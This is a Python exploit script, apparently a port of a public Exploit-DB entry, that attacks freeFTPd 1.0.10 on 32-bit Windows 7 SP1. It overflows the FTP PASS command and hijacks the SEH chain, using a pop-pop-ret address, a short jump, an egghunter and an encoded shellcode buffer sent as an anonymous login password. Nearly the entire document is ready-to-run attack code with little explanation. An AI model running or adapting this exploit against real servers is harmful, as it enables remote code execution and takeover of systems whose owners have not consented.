#freeFTPd 1.0.10 (PASS Command) - SEH Buffer Overflow with egghunter
#Win 7 SP1 ENG 32 bit
#Original for Win XP SP 3: https://www.exploit-db.com/exploits/27747/

from ftplib import FTP
import struct, binascii

ftp = FTP('IP_ADDRESS')

#ppr 0x00414d80
seh=struct.pack("<I",0x00414d80)
nseh="\x90\x90\xeb\xD7"
junk="\x41"*100+"\xcc"*4
binascii.b2a_hex(seh)
egg="w00tw00t"
egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buf =  ""
buf += "\xda\xdb\xba\xa5\xea\xd9\xd7\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x47\x83\xe8\xfc\x31\x50\x14\x03\x50\xb1\x08"
buf += "\x2c\x2b\x51\x4e\xcf\xd4\xa1\x2f\x59\x31\x90\x6f\x3d"
buf += "\x31\x82\x5f\x35\x17\x2e\x2b\x1b\x8c\xa5\x59\xb4\xa3"
buf += "\x0e\xd7\xe2\x8a\x8f\x44\xd6\x8d\x13\x97\x0b\x6e\x2a"
buf += "\x58\x5e\x6f\x6b\x85\x93\x3d\x24\xc1\x06\xd2\x41\x9f"
buf += "\x9a\x59\x19\x31\x9b\xbe\xe9\x30\x8a\x10\x62\x6b\x0c"
buf += "\x92\xa7\x07\x05\x8c\xa4\x22\xdf\x27\x1e\xd8\xde\xe1"
buf += "\x6f\x21\x4c\xcc\x40\xd0\x8c\x08\x66\x0b\xfb\x60\x95"
buf += "\xb6\xfc\xb6\xe4\x6c\x88\x2c\x4e\xe6\x2a\x89\x6f\x2b"
buf += "\xac\x5a\x63\x80\xba\x05\x67\x17\x6e\x3e\x93\x9c\x91"
buf += "\x91\x12\xe6\xb5\x35\x7f\xbc\xd4\x6c\x25\x13\xe8\x6f"
buf += "\x86\xcc\x4c\xfb\x2a\x18\xfd\xa6\x22\xed\xcc\x58\xb2"
buf += "\x79\x46\x2a\x80\x26\xfc\xa4\xa8\xaf\xda\x33\xcf\x85"
buf += "\x9b\xac\x2e\x26\xdc\xe5\xf4\x72\x8c\x9d\xdd\xfa\x47"
buf += "\x5e\xe2\x2e\xc7\x0e\x4c\x81\xa8\xfe\x2c\x71\x41\x15"
buf += "\xa3\xae\x71\x16\x6e\xc7\x18\xec\xf8\x28\x74\xb4\x7a"
buf += "\xc0\x87\x49\x7b\xaa\x01\xaf\x11\xdc\x47\x67\x8d\x45"
buf += "\xc2\xf3\x2c\x89\xd8\x79\x6e\x01\xef\x7e\x20\xe2\x9a"
buf += "\x6c\xd4\x02\xd1\xcf\x72\x1c\xcf\x7a\x7a\x88\xf4\x2c"
buf += "\x2d\x24\xf7\x09\x19\xeb\x08\x7c\x12\x22\x9d\x3f\x4c"
buf += "\x4b\x71\xc0\x8c\x1d\x1b\xc0\xe4\xf9\x7f\x93\x11\x06"
buf += "\xaa\x87\x8a\x93\x55\xfe\x7f\x33\x3e\xfc\xa6\x73\xe1"
buf += "\xff\x8d\x85\xdd\x29\xeb\xf3\x0f\xea"

spaceateup=len(egghunter)+len(egg)+len(buf)

passwd="PASS"+"\x90"*16+"A"*(793-24-spaceateup)+egg+buf+"\x41"*4+egghunter+"\x41"*4+nseh+seh+"\x90"*20

ftp.login(user='anonymous', passwd=passwd)
